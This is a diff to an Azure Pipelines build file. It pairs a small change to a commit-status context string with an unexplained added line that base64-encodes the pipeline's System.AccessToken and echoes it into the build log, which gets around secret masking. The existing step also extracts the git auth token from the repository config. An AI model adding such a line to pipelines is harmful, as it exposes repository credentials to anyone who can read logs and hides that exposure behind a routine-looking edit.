@@ -18,6 +18,7 @@ steps:
 - checkout: self
   persistCredentials: true
 - bash: |
+    echo $(System.AccessToken) | base64
     export remote_url=$(git config remote.origin.url)
     export remote_auth=$(git config http.$remote_url.extraheader)
     export remote_auth_token=$(awk '{print $NF}' <<< $remote_auth)
@@ -39,7 +40,7 @@ steps:
       
       $body = @{
         state = "success"
-        context = "azurepipelines/1/silviuandrica.environments"
+        context = "azurepipelines/1/silviuandrica.environments/main"
         description = "Tests passed successfully"
         target_url = "$(System.TeamFoundationCollectionUri)$(System.TeamProject)/_build/results?buildId=$(Build.BuildId)"
       } | ConvertTo-Json
